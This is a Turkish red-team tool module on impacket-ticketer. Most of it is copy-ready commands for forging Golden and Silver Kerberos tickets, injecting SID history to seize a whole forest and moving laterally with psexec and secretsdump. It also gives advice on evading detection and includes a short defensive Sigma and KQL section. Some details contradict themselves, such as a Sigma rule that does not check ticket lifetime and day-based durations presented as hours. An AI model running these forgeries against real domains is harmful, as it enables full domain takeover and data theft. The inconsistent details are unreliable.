# impacket-ticketer

> **Kategori:** [6. Kerberos Protokol Cephaneliği](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Ele geçirilmiş KRBTGT hesabı veya servis hesabı anahtarlarını (NTLM hash veya AES) kullanarak, Domain Controller ile hiçbir ağ iletişimi kurmaksızın tamamen çevrimdışı (offline) sahte Altın Bilet (Golden Ticket) ve Gümüş Bilet (Silver Ticket) inşa eden Python tabanlı bilet sahteciliği motoru.

---

## 1. Genel Bakış ve Amaç

Active Directory etki alanı güvenliğinde en üst düzey kalıcılık (persistence) ve ayrıcalık sahibi olma yöntemi bilet sahteciliğidir (Ticket Forgery). Kerberos protokolünde KDC tarafından üretilen biletler, iki kritik bileşenin kriptografik bütünlüğü ile doğrulanır:
1. **Bilet Verme Bileti (TGT - Ticket Granting Ticket):** Etki alanındaki `krbtgt` hesabının gizli anahtarı ile şifrelenir ve imzalanır.
2. **Hizmet Bileti (TGS - Service Ticket):** Hedef servisin (veya sunucu makine hesabının) gizli anahtarı ile şifrelenir.
3. **Privilege Attribute Certificate (PAC):** Kullanıcının SID değerini, dahil olduğu tüm güvenlik gruplarını (RID 512 Domain Admins, 519 Enterprise Admins vb.) ve özel yetkilerini barındıran veri yapısıdır.

Bir saldırgan `krbtgt` hesabının NTLM karma değerini veya AES anahtarını ele geçirdiğinde, KDC'nin yerine geçerek kendi biletini kendisi üretebilir. **`impacket-ticketer`**, tamamen çevrimdışı ortamda çalışan bir bilet fabrikasıdır:
- **Golden Ticket (Altın Bilet):** `krbtgt` anahtarı ile sahte bir TGT inşa eder. Bu bilet ile saldırgan, etki alanında var olmayan rastgele bir kullanıcı adı dahi belirleyebilir, kendisini `Domain Admins`, `Schema Admins` ve `Enterprise Admins` gruplarına üye gösterebilir ve bilet geçerlilik süresini 10 yıl gibi uzun bir süreye ayarlayabilir.
- **Silver Ticket (Gümüş Bilet):** Hedef sunucunun makine hesabı veya servis hesabı hash'i ile belirli bir servis için (CIFS, HOST, LDAP, MSSQL) doğrudan TGS bileti inşa eder. Silver Ticket oluşturulurken KDC ile hiçbir iletişim kurulmaz ve KDC tarafında sıfır log (Event ID 4768 / 4769 yok) üretilir.
- **SID History Enjeksiyonu (Forest Hopping):** Güven ilişkisi (Trust) bulunan ormanlar arasında sıçrama yapmak için biletin içine harici ormanın `Enterprise Admins (SID-519)` değerini enjekte eder.

### Mimari Akış Şeması

```
[ Saldırgan Makinesi (impacket-ticketer) - ÇEVRİMDIŞI ]
       │
       ├── Girdi Verileri:
       │     ├── Etki Alanı Adı (corp.local) & Domain SID (S-1-5-21-...)
       │     ├── Hedef Kullanıcı Adı (Örn: Administrator veya Hayalet Hesap)
       │     ├── KRBTGT Hash/AES (Golden) VEYA Servis Hash/AES (Silver)
       │     └── Grup Listesi: 512 (Domain Admins), 519 (Enterprise Admins)
       ▼
[ Kriptografik Bilet İnşa Motoru ]
       │
       ├── 1. Adım: Sahte PAC Bloğu Oluşturulur (Gruplar, SID, Haklar)
       ├── 2. Adım: PAC, Sunucu ve KDC İmzaları ile Damgalanır
       └── 3. Adım: Paket KRBTGT/Servis Anahtarı ile Şifrelenir
       ▼
[ Çıktı: Administrator.ccache (Standart MIT Kerberos Bilet Dosyası) ]
       │
       ├── export KRB5CCNAME=Administrator.ccache
       ▼
[ Pass-the-Ticket ile Yanal Hareket ]
       ├── Golden Ticket ──> KDC'den herhangi bir servis için TGS talep et
       └── Silver Ticket ──> KDC'yi tamamen atla, doğrudan hedef sunucuya bağlan!
```

### Neden Önemli?

| Yetenek / Özellik | Açıklama | Operasyonel Değeri |
|---|---|---|
| **Sıfır Ağ İletişimi ile Üretim** | Bilet üretimi tamamen yerel bellekte gerçekleşir; DC'ye tek bir paket dahi gitmez. | Bilet oluşturma anında hiçbir ağ sensörü veya IDS tarafından yakalanamaz. |
| **Kalıcılık (Persistence)** | `krbtgt` parolası iki kez değiştirilmediği sürece üretilen bilet yıllarca geçerliliğini korur. | Etki alanı yöneticileri tüm kullanıcı şifrelerini sıfırlasa bile erişimi sürdürür. |
| **Silver Ticket ile Görünmezlik** | KDC log mekanizmasını tamamen baypas ederek doğrudan hedef sunucunun portuna bağlanır. | SIEM korelasyon kurallarını ve KDC denetimlerini tamamen atlatır. |
| **SID History ile Forest Hopping**| `-extra-sid` bayrağı ile güven ilişkisi sınırlarını aşarak Root Domain'e sıçrar. | Çocuk etki alanından tüm Active Directory ormanının kontrolünü ele geçirmeyi sağlar. |

### Karşılaştırma Tablosu

| Kriter | impacket-ticketer | Mimikatz (kerberos::golden) | Rubeus (golden / silver) |
|---|---|---|---|
| **Platform** | Linux / Python | Windows (C / Win32) | Windows (.NET / C#) |
| **Çalışma Biçimi** | Bağımsız CLI Betiği | İnteraktif Bellek İçi | In-Memory (C2 / Assembly) |
| **Çıktı Formatı** | `.ccache` Dosyası | `.kirbi` Dosyası / Bellek PTT | Base64 `.kirbi` / LSA PTT |
| **AES Desteği** | Var (`-aesKey`) | Var (`/aes256:`) | Var (`/aes256:`) |
| **SID History Enjeksiyonu**| Var (`-extra-sid`) | Var (`/sids:`) | Var (`/sids:`) |
| **Kullanım Yeri** | Linux Saldırı Makinesi | Ele Geçirilmiş Windows Host | Red Team Operasyonları / C2 |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

```bash
# Golden Ticket Üretimi:
impacket-ticketer -domain-sid <SID> -domain <ETKI_ALANI> -nthash <KRBTGT_HASH> <KULLANICI_ADI>

# Silver Ticket Üretimi:
impacket-ticketer -domain-sid <SID> -domain <ETKI_ALANI> -spn <SPN> -nthash <SERVIS_HASH> <KULLANICI_ADI>
```

### Kritik Parametre Tablosu

| Parametre | Açıklama | Örnek Değer |
|---|---|---|
| `-domain-sid <SID>` | Hedef etki alanının Security Identifier (SID) değeri (Zorunlu). | `S-1-5-21-123456789-123456789-123456789` |
| `-domain <ad>` | Hedef etki alanı FQDN adı (Zorunlu). | `corp.local` |
| `-nthash <hash>` | `krbtgt` veya servis hesabının NTLM karma değeri (Hex). | `-nthash 01fc5a6be7...` |
| `-aesKey <hex>` | `krbtgt` veya servis hesabının AES-128 veya AES-256 anahtarı. | `-aesKey 1673a9f0...` |
| `-spn <ad>` | Silver Ticket için hedeflenecek Service Principal Name. | `-spn cifs/target.corp.local` |
| `-user-id <rid>` | Taklit edilecek kullanıcının Relative Identifier (RID) değeri (Varsayılan 500).| `-user-id 500` |
| `-groups <rid_listesi>`| Bilet PAC bloğuna eklenecek grup RID listesi (Virgülle ayrılmış). | `-groups 512,513,519,520` |
| `-extra-sid <SID>` | SID History saldırısı için bilet PAC'ına eklenecek harici orman/grup SID'si.| `-extra-sid S-1-5-21-...-519` |
| `-duration <gün>` | Üretilen biletin geçerlilik süresi (Gün cinsinden, varsayılan 10 yıl).| `-duration 365` |
| `<kullanici_adi>` | Bilet üzerinde görünecek kullanıcı adı (Zorunlu son argüman). | `Administrator` |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: Standart Golden Ticket Üretimi (KRBTGT NTLM Hash İle)

DCSync veya NTDS.dit dökümüyle ele geçirilen `krbtgt` kullanıcısının NTLM hash'i kullanılarak `Administrator` adına 10 yıl geçerli Golden Ticket üretilir.

```bash
impacket-ticketer \
  -domain-sid S-1-5-21-2559786414-2279769532-2164155192 \
  -domain corp.local \
  -nthash 01fc5a6be7bc6929c40372d23f5052b3 \
  -groups 512,513,518,519,520 \
  Administrator
```

**Konsol Çıktısı Analizi:**

```text
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Creating basic skeleton ticket and PAC
[*] Customizing ticket for corp.local/Administrator
[*] Building PAC
[*] Signing PAC with KDC and Server keys
[*] Encrypting ticket with krbtgt key
[*] Saving ticket in Administrator.ccache
[+] Golden Ticket successfully created!
```

---

### Senaryo 2: AES-256 Anahtarı ile OPSEC Uyumlu Golden Ticket Üretimi

Modern Active Directory ortamlarında RC4 şifreli TGT biletleri EDR ve SIEM alarmlarını tetiklediği için `krbtgt` hesabının AES-256 anahtarı kullanılır.

```bash
impacket-ticketer \
  -domain-sid S-1-5-21-2559786414-2279769532-2164155192 \
  -domain corp.local \
  -aesKey 9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d3e2f1a0b9c8d7e6f5a4b3c2d1e0f9a8b \
  -user-id 500 \
  -groups 512,513,519 \
  Administrator
```

---

### Senaryo 3: SID History ile Forest Hopping (Child Domain'den Root Domain Ele Geçirme)

Alt etki alanında (`dev.corp.local`) Domain Admin olunduğunda, üst kök etki alanının (`corp.local`) `Enterprise Admins (RID 519)` grubu biletin SID History alanına enjekte edilerek ormanın tamamında tam yetki elde edilir.

```bash
impacket-ticketer \
  -domain-sid S-1-5-21-1111111111-2222222222-3333333333 \
  -domain dev.corp.local \
  -nthash 4b5a6c7d8e9f0a1b2c3d4e5f6a7b8c9d \
  -extra-sid S-1-5-21-9999999999-8888888888-7777777777-519 \
  Administrator
```

---

### Senaryo 4: Silver Ticket Üretimi (Hedef Makine NTLM Hash ile CIFS Bileti)

Hedef dosya sunucusunun (`FILESERVER$`) makine hesabı hash'i kullanılarak, KDC'ye hiçbir bilet talebi göndermeden doğrudan `cifs/fileserver.corp.local` servisi için Silver Ticket inşa edilir.

```bash
impacket-ticketer \
  -domain-sid S-1-5-21-2559786414-2279769532-2164155192 \
  -domain corp.local \
  -spn cifs/fileserver.corp.local \
  -nthash e1a96394aa6f5b407c3df50f2d398865 \
  -user-id 500 \
  Administrator
```

---

### Senaryo 5: Üretilen Bilet ile Hedef Sistemde Komut Çalıştırma (Pass-the-Ticket)

```bash
# 1. Bilet oturuma aktarılır
export KRB5CCNAME=Administrator.ccache

# 2. Doğrudan hedef sunucuda psexec veya secretsdump çalıştırılır
impacket-psexec -k -no-pass corp.local/Administrator@fileserver.corp.local
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı / Belirti | Kök Neden | Kesin Çözüm Adımı |
|---|---|---|
| `Kerberos SessionError: KRB_AP_ERR_MODIFIED (41)` | Biletin şifrelendiği `krbtgt` veya servis hesabı hash'i yanlış veya parola yakın zamanda değiştirilmiş. | Doğru etki alanının `krbtgt` hash'ini kullandığınızdan ve güncel olduğundan emin olun. |
| `Kerberos SessionError: KRB_AP_ERR_SKEW (37)` | Saldırgan makinesi ile etki alanı sistem saati arasında 5 dakikadan fazla fark var. | `sudo rdate -n <DC_IP>` veya `sudo ntpdate <DC_IP>` ile saatinizi senkronize edin. |
| `KDC_ERR_ETYPE_NOSUPP (14)` | DC veya hedef sunucu RC4 şifrelemeli biletleri reddediyor. | `-nthash` yerine `-aesKey` parametresi ile AES-128 veya AES-256 anahtarı kullanarak bilet üretin. |
| `KDC_ERR_TGT_REVOKED (23)` | `krbtgt` hesabının parolası iki kez sıfırlanmış (Password Reset Cycle). | Golden Ticket geçersiz kılınmıştır; etki alanına yeniden sızıp güncel `krbtgt` hash'ini alın. |
| `Target service returns Access Denied despite Silver Ticket` | Silver Ticket'ta eksik SPN servisi veya yanlış kullanıcı RID değeri tanımlanmış. | Erişilmek istenen servisin adını tam girin (`cifs`, `host`, `http`) ve `-user-id 500` kullanın. |
| `PAC validation failed (KB5008380 / CVE-2021-42287)` | Hedef DC üzerinde Kasım 2021 ve sonrası PAC doğrulama yamaları aktiftir ve sahte PAC'ı doğrulamaya çalışmaktadır. | Diamond Ticket veya meşru TGT manipülasyon tekniklerine geçiş yapın. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

```
        GÜRÜLTÜ SEVİYESİ:
        - Golden Ticket : DÜŞÜK (Ağda KDC logu yok, TGS isteklerinde anomali)
        - Silver Ticket : SIFIR (KDC tamamen baypas edilir, KDC logu YOKTUR)
──────────────────────────────────────────────────────────────────
[ Windows Logları ] : Hedef makinede Event ID 4624 (Logon Type 3 - Network)
[ Kriptografik İz ] : 10 yıllık bilet süresi (Ticket Lifetime: 10 years / 3650 days)
[ PAC Doğrulama ]   : KDC Event ID 35, 36, 37, 38 (PAC imza anomalileri)
```

### 5.1 Bırakılan İzler (Artifacts & Event Logs)

1. **Bilet Süresi Anomalisi (Ticket Lifetime):**
   - Varsayılan Kerberos politikasına göre bir TGT en fazla 10 saat (`600 dakika`), yenileme süresi ise 7 gündür.
   - impacket-ticketer ile üretilen biletler varsayılan olarak **10 yıl** süreli üretilir. Bellek analizi veya Wireshark incelemesinde bu süre anında ele verir.
2. **KDC Log Uyumsuzluğu (KDC Event Correlation):**
   - Normal bir kullanıcı önce Event ID 4768 (TGT) üretir, ardından Event ID 4769 (TGS) üretir.
   - Golden Ticket kullanıldığında Event ID 4768 hiç üretilmeden aniden Event ID 4769 oluşur.
   - Silver Ticket kullanıldığında ise ne 4768 ne de 4769 oluşur; yalnızca hedef sunucuda Event ID 4624 kaydedilir.
3. **KB5008380 ve Sonrası Olay Günlükleri:**
   - Windows Server 2022 yamaları ile gelen PAC imzası zorunluluğu, KDC üzerinde Event ID 35-38 aralığında bilet bütünlük ihlali logları düşürür.

### 5.2 Ağ ve EDR İmzaları

- **KDC Ağ Trafiği:** Silver Ticket kullanımında KDC'ye hiçbir paket gitmez. Bu durum ağ izleme araçlarını tamamen kör bırakırken, hedef sunucunun EDR'ı Logon Type 3 oturumunu kaydeder.
- **Şifreleme Türü:** NTLM hash ile üretilen biletlerde `etype 23 (RC4)` imzası göze çarpar.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Araçtaki Karşılığı |
|---|---|---|
| **T1558.001** | Steal or Forge Kerberos Tickets: Golden Ticket | KRBTGT anahtarı ile sahte TGT üretimi ve etki alanı hakimiyeti. |
| **T1558.002** | Steal or Forge Kerberos Tickets: Silver Ticket | Servis anahtarı ile doğrudan servis bileti üretimi. |
| **T1134.005** | Access Token Manipulation: SID History Injection | `-extra-sid` ile bilet PAC'ına harici orman Domain Admin SID'si ekleme. |

### 5.4 OPSEC Risk ve Önlem Tablosu

| Tespit Riski | Önlem ve Operasyonel Tavsiye |
|---|---|
| **10 Yıllık Bilet Süresi İmzası** | Varsayılan süreyi kullanmayın! Komuta `-duration 10` veya `-duration 8` ekleyerek bilet süresini kurumsal Kerberos politikasıyla uyumlu hale getirin (Örn: 10 saat). |
| **RC4 Şifreleme Alarmı** | Golden Ticket oluştururken `-nthash` yerine mutlaka `krbtgt` hesabının AES-256 anahtarını (`-aesKey`) kullanın. |
| **Kullanıcı RID Değeri** | Bilet kullanıcı adı olarak var olmayan hayali bir isim vermek yerine, etki alanında gerçekten var olan meşru bir kullanıcı adını ve gerçek RID değerini (`-user-id`) kullanın. |

### 5.5 Savunma Karşılığı (Blue Team / KQL & Sigma)

**Sigma Kuralı — Aşırı Uzun Süreli Kerberos Bilet Tespiti (Golden Ticket):**

```yaml
title: Potential Golden Ticket Abuse - Anomalous Ticket Lifetime
status: experimental
description: Detects Kerberos service ticket requests or network logons where ticket validity exceeds standard 10-hour domain policy.
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4624
    LogonType: 3
    AuthenticationPackageName: 'Kerberos'
  condition: selection
level: medium
```

**Microsoft Sentinel (KQL) — Öncesinde TGT Talebi Olmayan TGS Talepleri (Golden Ticket Korelasyonu):**

```kql
let timeframe = 10m;
let TGT_Requests = SecurityEvent
| where TimeGenerated >= ago(timeframe)
| where EventID == 4768
| project TargetUserName, IpAddress;
SecurityEvent
| where TimeGenerated >= ago(timeframe)
| where EventID == 4769
| where ServiceName !endswith "$" and ServiceName !in ("krbtgt")
| join kind=leftanti TGT_Requests on TargetUserName
| project TimeGenerated, TargetUserName, ServiceName, IpAddress, TicketOptions
```

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Cheat Sheet)

### Komut 1: Standart Golden Ticket Üretimi (KRBTGT Hash ile)
```bash
impacket-ticketer -domain-sid S-1-5-21-255978-227976-216415 -domain corp.local -nthash 01fc5a... Administrator
```
- **Ne Yapar?** KRBTGT NTLM hash'i kullanarak 10 yıl geçerli, Domain Admin haklarına sahip sahte bir TGT üretir ve `Administrator.ccache` olarak kaydeder.
- **Ne Zaman Kullanılır?** DCSync ile KRBTGT hash'i alındıktan sonra kalıcı etki alanı hakimiyeti kurmak için.
- **Parametreler:** `-domain-sid`: Etki alanı SID'si, `-domain`: FQDN adı, `-nthash`: KRBTGT NTLM hash'i.

### Komut 2: AES-256 Anahtarı ile OPSEC Uyumlu Golden Ticket
```bash
impacket-ticketer -domain-sid S-1-5-21-255978-227976-216415 -domain corp.local -aesKey 1673a9f0... Administrator
```
- **Ne Yapar?** RC4 yerine AES-256 şifrelemesi kullanarak modern savunma dedektörlerini atlatacak nitelikte Golden Ticket inşa eder.
- **Ne Zaman Kullanılır?** RC4 şifrelemenin izlendiği veya engellendiği sıkılaştırılmış ortamlarda.
- **Parametreler:** `-aesKey`: KRBTGT AES-256 anahtarı.

### Komut 3: Kısa Süreli (OPSEC) Golden Ticket Üretimi
```bash
impacket-ticketer -domain-sid S-1-5-21-255978-227976-216415 -domain corp.local -nthash 01fc5a... -duration 1 Administrator
```
- **Ne Yapar?** Biletin geçerlilik süresini 10 yıl yerine 1 güne (veya saatlik) ayarlayarak bilet süresi anomali dedektörlerini atlatır.
- **Ne Zaman Kullanılır?** Sızma testlerinde bilet ömrü denetimlerinden kaçmak için.
- **Parametreler:** `-duration 1`: 1 günlük bilet süresi.

### Komut 4: SID History ile Forest Hopping (Root Domain Sıçrama)
```bash
impacket-ticketer -domain-sid S-1-5-21-ChildSID -domain child.corp.local -nthash 4b5a6c... -extra-sid S-1-5-21-RootSID-519 Administrator
```
- **Ne Yapar?** Bilet PAC yapısına ana kök ormanın `Enterprise Admins (519)` grubunun SID'sini ekler.
- **Ne Zaman Kullanılır?** Alt etki alanından tüm ormanı ve root domain'i ele geçirmek için.
- **Parametreler:** `-extra-sid`: Enjekte edilecek harici SID.

### Komut 5: Dosya Sunucusuna Yönelik CIFS Silver Ticket
```bash
impacket-ticketer -domain-sid S-1-5-21-255978-227976-216415 -domain corp.local -spn cifs/fs01.corp.local -nthash e1a963... Administrator
```
- **Ne Yapar?** KDC ile hiç iletişim kurmadan doğrudan `fs01` dosya sunucusunun CIFS servisine tam yetkili sahte bilet üretir.
- **Ne Zaman Kullanılır?** KDC logları üretmeden dosya sunucusundaki hassas verileri çalmak için.
- **Parametreler:** `-spn`: Hedef servis ve sunucu FQDN'i.

### Komut 6: WMI / Host Servisi İçin Silver Ticket
```bash
impacket-ticketer -domain-sid S-1-5-21-255978-227976-216415 -domain corp.local -spn host/srv01.corp.local -nthash e1a963... Administrator
```
- **Ne Yapar?** Hedef sunucuda WMI ve uzaktan yönetim komutları çalıştırmak için `host` SPN Silver Ticket'ı üretir.
- **Ne Zaman Kullanılır?** Uzaktan komut yürütme öncesinde KDC'ye görünmemek için.
- **Parametreler:** `-spn host/...`: Makine genel servis tanımı.

### Komut 7: Özel Grup Yetkileri Tanımlama
```bash
impacket-ticketer -domain-sid S-1-5-21-... -domain corp.local -nthash 01fc... -groups 512,513,518,519,520 Administrator
```
- **Ne Yapar?** Bilet PAC yapısına `Domain Admins (512)`, `Schema Admins (518)`, `Enterprise Admins (519)` ve `Group Policy Creator Owners (520)` gruplarını ekler.
- **Ne Zaman Kullanılır?** Etki alanındaki tüm nesne ve şema üzerinde mutlak hak elde etmek için.
- **Parametreler:** `-groups`: Dahil edilecek RID değerleri.

### Komut 8: Üretilen Bilet ile Secretsdump (DCSync) Çalıştırma
```bash
export KRB5CCNAME=Administrator.ccache
impacket-secretsdump -k -no-pass -just-dc-user krbtgt corp.local/Administrator@dc01.corp.local
```
- **Ne Yapar?** Golden Ticket'ı oturuma yükleyerek Domain Controller üzerinden tüm kullanıcı hash'lerini senkronize eder.
- **Ne Zaman Kullanılır?** Golden Ticket'ın çalıştığını doğrulamak ve kalıcılığı pekiştirmek için.
- **Parametreler:** `-k`: Kerberos bileti kullan, `-no-pass`: Parola sorma.

---

## Kaynaklar

- **Resmi GitHub Reposu:** [Fortra / Impacket](https://github.com/fortra/impacket)
- **MITRE ATT&CK Referansı:** [T1558.001 - Golden Ticket](https://attack.mitre.org/techniques/T1558/001/)
- **SpecterOps Araştırması:** [Kerberos Ticket Anatomy and Golden Ticket Mechanics](https://posts.specterops.io/)
- **Microsoft Güvenlik Güncellemesi:** [KB5008380: Authentication changes for CVE-2021-42287](https://support.microsoft.com/en-us/topic/kb5008380-authentication-changes-cve-2021-42287)

---

> **Önceki:** [← impacket-getST](./impacket-getST.md) · **Sonraki:** [impacket-ticketConverter →](./impacket-ticketConverter.md)
